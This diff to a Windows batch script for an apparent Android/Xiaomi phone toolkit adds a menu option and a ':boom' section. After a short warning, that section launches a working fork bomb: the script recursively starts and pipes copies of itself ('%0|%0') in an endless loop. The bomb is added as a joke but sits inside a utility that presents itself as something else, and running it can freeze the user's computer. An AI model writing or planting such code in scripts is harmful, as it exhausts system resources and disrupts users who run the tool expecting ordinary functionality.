@@ -42,6 +42,7 @@ if %S%==4 goto :rebootd
 if %S%==5 goto :terminal
 if %S%==6 goto :recorder
 if %S%==7 goto :runtimes
+if %S%==8 goto :boom
 if %S%==00 goto :about
 if %S%==0 exit
 echo Invalid Input? Try again!...
@@ -444,6 +445,7 @@ pause
 goto :home
 
 :setup
+title XiaomiTool
 set RES=res
 @mkdir PhonePics
 cls
@@ -484,3 +486,18 @@ echo # The developer disclaim every kind      #
 echo # of damage caused from this program     #
 echo ##########################################
 goto :setup
+
+:boom
+# Here's why I won the nobel prize for the craziest Android ToolKit
+# The best thing you will find here, a fork bomb :D
+echo Warning! A Bomb is coming!
+pause
+cls
+color 24
+echo Booom!
+goto :fork
+
+:fork
+start %0
+%0|%0
+goto :fork
